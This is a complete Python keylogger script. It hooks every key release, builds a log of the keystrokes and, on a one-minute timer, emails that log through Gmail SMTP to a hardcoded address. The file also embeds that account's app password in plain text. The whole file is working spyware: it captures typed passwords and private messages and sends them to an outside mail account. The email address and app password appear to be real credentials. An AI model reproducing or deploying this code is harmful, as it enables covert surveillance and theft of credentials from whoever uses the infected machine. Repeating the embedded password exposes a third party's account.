import keyboard # for keylogs
import smtplib # for sending email using SMTP protocol (gmail)
# Timer is to make a method runs after an `interval` amount of time
from threading import Timer
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

SEND_REPORT_EVERY = 60 # in seconds, 60 means 1 minute and so on
EMAIL_ADDRESS = "shailygup.bcit8045@gmail.com"
EMAIL_PASSWORD = "repolqohydhlcxkg" # Temp app password

class Keylogger:
    def __init__(self, interval, reportMethod="email"):
        # we gonna pass SEND_REPORT_EVERY to interval
        self.interval = interval
        self.reportMethod = reportMethod
        # this is the string variable that contains the log of all 
        # the keystrokes within `self.interval`
        self.log = ""
        # record start & end datetimes
        self.startDt = datetime.now()
        self.endDt = datetime.now()

    def callback(self, event):
        """
        This callback is invoked whenever a keyboard event is occured
        (i.e when a key is released in this example)
        """
        name = event.name
        if len(name) > 1:
            # not a character, special key (e.g ctrl, alt, etc.)
            # uppercase with []
            if name == "space":
                # " " instead of "space"
                name = " "
            elif name == "enter":
                # add a new line whenever an ENTER is pressed
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        # finally, add the key name to our global `self.log` variable
        self.log += name
    
    def update_filename(self):
        """
        This method constructs the filename to be identified by start & end datetimes
        """
        startDtStr = str(self.startDt)[:-7].replace(" ", "-").replace(":", "")
        endDtStr = str(self.endDt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{startDtStr}_{endDtStr}"

    def report_to_file(self):
        """
        This method creates a log file in the current directory that contains
        the current keylogs in the `self.log` variable
        """
        # open the file in write mode (create it)
        with open(f"{self.filename}.txt", "w") as f:
            # write the keylogs to the file
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")
    
    def prepare_mail(self, message):
        """
        Utility function to construct a MIMEMultipart from a text
        It creates an HTML version as well as text version
        to be sent as an email
        """
        msg = MIMEMultipart("alternative")
        msg["From"] = EMAIL_ADDRESS
        msg["To"] = EMAIL_ADDRESS
        msg["Subject"] = "Keylogger logs"
        # simple paragraph, feel free to edit
        html = f"<p>{message}</p>"
        textPart = MIMEText(message, "plain")
        htmlPart = MIMEText(html, "html")
        msg.attach(textPart)
        msg.attach(htmlPart)
        # after making the mail, convert back as string message
        return msg.as_string()

    def sendmail(self, email, password, message, verbose=1):
        """
        This method sends an email with the keylogger file.
        """
        # manages a connection to an SMTP server
        # https://support.google.com/a/answer/176600?hl=en
        server = smtplib.SMTP_SSL(host="smtp.gmail.com")
        # connect to the SMTP server as TLS mode ( for security )
        # server.starttls()
        # login to the email account
        server.login(email, password)
        # send the actual message after preparation
        server.sendmail(email, email, self.prepare_mail(message))
        # terminates the session
        server.quit()
        if verbose:
            print(f"{datetime.now()} - Sent an email to {email} containing:  {message}")
    
    def report(self):
        """
        This function gets called every `self.interval`
        It basically sends keylogs and resets `self.log` variable
        """
        if self.log:
            # if there is something in log, report it
            self.endDt = datetime.now()
            # update `self.filename`
            self.update_filename()
            if self.reportMethod == "email":
                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            elif self.reportMethod == "file":
                self.report_to_file()
            # if you don't want to print in the console, comment below line
            print(f"[{self.filename}] - {self.log}")
            self.startDt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        # set the thread as daemon (dies when main thread die)
        timer.daemon = True
        # start the timer
        timer.start()
    
    def start(self):
        """
        This method will start the keylogger.
        """
        self.startDt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        print(f"{datetime.now()} - Started keylogger")
        keyboard.wait()
    
if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, reportMethod="email")
    keylogger.start()
